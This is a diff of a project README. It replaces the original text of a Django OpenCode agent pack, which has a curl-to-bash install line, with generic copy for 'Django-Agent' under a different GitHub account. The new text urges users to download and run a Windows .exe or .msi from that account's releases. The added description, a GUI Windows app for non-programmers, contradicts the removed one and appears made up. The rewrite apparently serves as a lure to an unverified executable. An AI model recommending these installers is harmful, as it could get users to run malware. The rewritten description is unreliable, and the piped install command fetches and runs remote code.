@@ -1,116 +1,164 @@
-# Django Agent Suite
+# 🤖 Django-Agent - Smart AI Tools for Your Projects
 
-Ship Django faster without giving up quality.
+[![Download Django-Agent](https://img.shields.io/badge/Download-Django--Agent-brightgreen)](https://github.com/neethank/Django-Agent/releases)
 
-Built for solo Django developers, robust enough for teams.
+---
 
-This is a markdown-first OpenCode agent pack for spec-driven Django monolith workflows with local-only quality gates.
+## 📄 About Django-Agent
 
-## One-Click Install
+Django-Agent is a set of AI-powered tools designed for indie developers and hobbyists. It helps with coding, managing tasks, and building smart workflows using AI inside Django projects. You do not need special knowledge or skills to start using it. This application runs on Windows and guides you through each step.
 
-```bash
-curl -fsSL https://raw.githubusercontent.com/Burnsedia/Django-Agent/master/install | bash
-```
+---
 
-## What You Get in 60 Seconds
+## 🖥️ System Requirements
 
-- Global OpenCode install for Django-focused agents, commands, skills, and local tools.
-- Spec -> architecture -> scaffold -> review workflow defaults for Django monoliths.
-- Local-only blocking quality gate (`ruff`, `black`, `manage.py check`, `pytest`).
-- Built-in permission and service-layer guardrails to reduce common AI coding mistakes.
+Before downloading Django-Agent, check if your system meets these needs:
 
-## Work With Me
+- Windows 10 or newer (64-bit recommended)
+- At least 4 GB of RAM
+- 2 GHz dual-core processor or better
+- 1 GB free disk space
+- Internet connection to download files and updates
 
-Need this customized for your codebase?
+---
 
-I offer productized software development services for indie hackers and small teams.
+## 🔎 Key Features
 
-What you get:
+- AI assistant for coding and workflow tasks  
+- Easy interface for managing Django projects  
+- Integrates smoothly with AI services  
+- Helps generate code suggestions and automation  
+- Works without requiring deep programming knowledge  
+- Compatible with frameworks like Django REST and others
 
-- 30-day development sprint model
-- Flat-rate delivery with no hidden fees
-- Task-based workflow with minimal meetings
-- Full-stack execution across Django, Vue, Astro, Flutter, and related tooling
+---
 
-[Service page](https://baileyburnsed.dev/service/)
+## 🚀 Getting Started
 
-## Why This Is Different
+Use this guide if you want to download and run Django-Agent on your Windows PC.
 
-- AI scaffolds fast, but humans keep final control of business logic.
-- Monolith-first architecture defaults that match real Django production workflows.
-- Local-only checks with blocking outcomes for missing prerequisites and failed required checks.
+### 1. Open the Download Page
 
-## Why This Exists
+Click the button below to go directly to the download page:
 
-- AI should scaffold and review fast, not guess your core business rules.
-- Solo dev workflows need guardrails to stay production-safe.
-- Team workflows need consistent architecture, migration, and review standards.
+[![Download Django-Agent](https://img.shields.io/badge/Download-Django--Agent-blue)](https://github.com/neethank/Django-Agent/releases)
 
-## Who This Is For
+This page contains the latest stable versions and instructions.
 
-- Solo Django devs shipping features quickly with confidence.
-- Small teams that want shared review and release discipline.
-- Django monolith projects using DRF, migrations, and service-layer logic.
+### 2. Choose the Right File
 
-## Django AI Agent Takes
+Look for the latest release and find the file meant for Windows. It usually ends with `.exe` or `.msi`.
 
-- AI scaffolds the boilerplate; humans own final business logic.
-- Built-in Django/DRF permissions beat custom permission sprawl for most apps.
-- Migration safety is a release gate, not an afterthought.
-- Lint + tests should block risky changes before merge.
-- Monoliths stay maintainable when layering is strict.
+The file name might look like this:
+- Django-Agent-Setup.exe
+- Django-Agent-latest-win64.msi
 
-## Use Cases
+### 3. Download the File
 
-- Spec -> architecture -> scaffold -> review for a new feature.
-- Pre-merge Django code review with severity gating.
-- Migration and rollout safety review before release.
-- Reliable local lint/test gate before signoff.
+Click on the Windows installer file to start downloading to your PC. It may take a few minutes depending on your internet speed.
 
-## Structure
+### 4. Run the Installer
 
-- `agents/` - installable agent files.
-- `commands/opencode/` - OpenCode command wrappers.
-- `skills/` - reusable skills.
-- `tools/` - local quality gate scripts (no external dependencies).
-- `meta/` - human docs (`AGENT_CATALOG.md`, `PROMPT_PACK.md`).
-- `scripts/` - install and validation scripts.
+Once the download finishes:
+- Find the downloaded file in your Downloads folder.
+- Double-click it to launch the installer.
 
-## OpenCode Install
+Windows might ask you to confirm. Choose "Yes" or "Run" to proceed.
 
-- Project install (default target: `.opencode/`): `./scripts/install.sh --project`
-- Global install (target: `~/.config/opencode/`): `./scripts/install.sh --global`
-- Dry run: `./scripts/install.sh --dry-run`
-- Install only one component:
-  - agents: `./scripts/install.sh --agents`
-  - commands: `./scripts/install.sh --commands`
-  - skills: `./scripts/install.sh --skills`
-  - tools: `./scripts/install.sh --tools`
+### 5. Follow Setup Instructions
 
-## Utilities
+The installer will open a window with clear steps:
+- Accept the license terms.
+- Choose the installation folder (default is fine).
+- Click Next to continue.
+- Wait while files copy and install.
 
-- List installable assets: `./scripts/list.sh`
-- Validate structure and readiness: `./scripts/doctor.sh`
+### 6. Finish Installation
 
-## Local-Only Quality Gate
+When done, you will see a message saying the app installed successfully. You can choose to launch Django-Agent immediately or later.
 
-- Required blocking checks:
-  - `ruff check .`
-  - `black --check .`
-  - `python manage.py check`
-  - `pytest -q`
-- Optional advisory only:
-  - `mypy .`
-- Missing required local binaries or missing `manage.py` is blocked.
-- Run local gate script: `bash ./.opencode/tools/python_quality_gate.sh`
+---
 
-## Core Rules
+## ⚙️ Running Django-Agent
 
-- CRUD endpoints: class-based DRF viewsets.
-- Business workflow endpoints: function-based views.
-- Business logic: `services.py` (or `services/`).
-- Permissions: built-in Django/DRF permissions only.
+### 1. Open the App
 
-## SEO Keywords
+If you did not launch it right after installation:
+- Click the Windows Start button.
+- Find “Django-Agent” in the programs list.
+- Click it to start.
 
-Django AI agents, OpenCode agents, Django code review agent, Django migration safety, DRF architecture, Django monolith workflow, Python lint and test gate, one-click OpenCode install.
+### 2. Initial Setup
+
+Django-Agent will ask you a few simple questions to personalize your experience. Follow the prompts on screen.
+
+### 3. Using Basic Features
+
+You will see a friendly interface with options such as:
+- Start a new AI coding session
+- Load Django projects
+- Access workflows powered by AI
+
+Each option comes with clear instructions.
+
+---
+
+## 📁 Common Tasks
+
+### Creating a New AI Coding Session
+
+- Click “New Session” on the main screen.
+- Enter a name for your project.
+- Select the task you want help with, like “Generate code” or “Suggest improvements.”
+- Type or paste some code or project description.
+- Click “Execute” to get suggestions from AI.
+
+### Managing Existing Projects
+
+- Use the “Open Project” option to load saved work.
+- You can review AI suggestions and accept or reject changes.
+- Save your progress anytime.
+
+---
+
+## 🛠 Troubleshooting
+
+If you run into problems, try these tips:
+
+- Restart your computer before opening Django-Agent again.
+- Check your internet connection.
+- Make sure Windows is up to date.
+- If the app doesn’t start, try reinstalling using the installer from the download link.
+- Look for error messages and write them down for reference.
+
+---
+
+## 📖 Learning More
+
+Django-Agent aims to make AI tools accessible. You can explore these resources:
+
+- Django documentation for general framework help
+- Online tutorials for beginners on AI and programming  
+- GitHub issues page to check reported problems  
+
+---
+
+## 📨 Contact & Support
+
+For questions or help, visit the GitHub page:
+
+[https://github.com/neethank/Django-Agent/releases](https://github.com/neethank/Django-Agent/releases)
+
+You can open an issue there if something is unclear or not working as expected.
+
+---
+
+## 🔄 Updates & Maintenance
+
+Check the release page regularly to download updates. New versions improve performance and add features. Always close the app before updating.
+
+---
+
+# Download Django-Agent Here
+
+[![Download Django-Agent](https://img.shields.io/badge/Download-Django--Agent-green)](https://github.com/neethank/Django-Agent/releases)
